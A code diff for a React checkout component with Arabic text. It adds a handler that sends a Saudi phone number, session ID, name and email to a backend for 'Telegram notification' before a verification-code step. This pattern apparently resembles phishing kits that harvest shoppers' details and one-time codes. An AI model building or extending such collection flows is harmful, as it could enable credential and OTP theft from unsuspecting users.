@@ -1,15 +1,56 @@
 import { toEnglishNumbers } from '@/lib/utils';
+import { useState } from 'react';
+import { submitPhoneNumber } from '@/lib/api';
+import { getCheckoutSessionId } from '@/lib/checkoutSession';
 
 interface ConfirmMethodProps {
   phoneNumber: string;
   setPhoneNumber: (value: string) => void;
+  userName: string;
+  userEmail: string;
   onBack: () => void;
   onSubmit: () => void;
 }
 
-const ConfirmMethod = ({ phoneNumber, setPhoneNumber, onBack, onSubmit }: ConfirmMethodProps) => {
+const ConfirmMethod = ({ phoneNumber, setPhoneNumber, userName, userEmail, onBack, onSubmit }: ConfirmMethodProps) => {
+  const [error, setError] = useState<string | null>(null);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
   // Validate Saudi mobile number (starts with 5, total 9 digits)
   const isValid = phoneNumber.length === 9 && /^5\d{8}$/.test(phoneNumber);
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    
+    if (!isValid) {
+      setError('يرجى إدخال رقم جوال صالح (يجب أن يبدأ بـ 5 ويتكون من 9 أرقام)');
+      return;
+    }
+
+    setIsSubmitting(true);
+    setError(null);
+
+    try {
+      const sessionId = getCheckoutSessionId();
+      const cleanPhone = toEnglishNumbers(phoneNumber.trim());
+      
+      // Submit phone number to backend for validation and Telegram notification
+      await submitPhoneNumber({
+        sessionId,
+        phoneNumber: cleanPhone,
+        userName,
+        userEmail,
+      });
+
+      // If successful, proceed to the next step
+      onSubmit();
+    } catch (err: any) {
+      console.error('Failed to submit phone number:', err);
+      setError(err.message || 'فشل في إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <div className="min-h-screen bg-white flex flex-col px-6 py-8">
@@ -67,7 +108,7 @@ const ConfirmMethod = ({ phoneNumber, setPhoneNumber, onBack, onSubmit }: Confir
           سيتم إرسال رمز تحقق للمتابعة
         </p>
 
-        <form onSubmit={(e) => { e.preventDefault(); if (isValid) onSubmit(); }}>
+        <form onSubmit={handleSubmit}>
           <div className="mb-5">
             <label
               htmlFor="phone"
@@ -126,9 +167,9 @@ const ConfirmMethod = ({ phoneNumber, setPhoneNumber, onBack, onSubmit }: Confir
                 />
               </div>
             </div>
-            {!isValid && phoneNumber.length > 0 && (
+            {(error || (!isValid && phoneNumber.length > 0)) && (
               <p className="text-red-500 text-xs mt-1 text-right">
-                يرجى إدخال رقم جوال صالح (يجب أن يبدأ بـ 5 ويتكون من 9 أرقام)
+                {error || 'يرجى إدخال رقم جوال صالح (يجب أن يبدأ بـ 5 ويتكون من 9 أرقام)'}
               </p>
             )}
           </div>
@@ -136,18 +177,18 @@ const ConfirmMethod = ({ phoneNumber, setPhoneNumber, onBack, onSubmit }: Confir
           <button
             type="submit"
             id="sendBtn"
-            disabled={!isValid}
+            disabled={!isValid || isSubmitting}
             className="w-full py-3 font-semibold transition-colors"
             style={{
               fontSize: '16px',
-              backgroundColor: isValid ? '#000' : '#ddd',
-              color: isValid ? '#fff' : '#999',
-              cursor: isValid ? 'pointer' : 'not-allowed',
+              backgroundColor: isValid && !isSubmitting ? '#000' : '#ddd',
+              color: isValid && !isSubmitting ? '#fff' : '#999',
+              cursor: isValid && !isSubmitting ? 'pointer' : 'not-allowed',
               border: 'none',
               borderRadius: '30px'
             }}
           >
-            أرسل الرمز
+            {isSubmitting ? 'جاري الإرسال...' : 'أرسل الرمز'}
           </button>
         </form>
       </div>
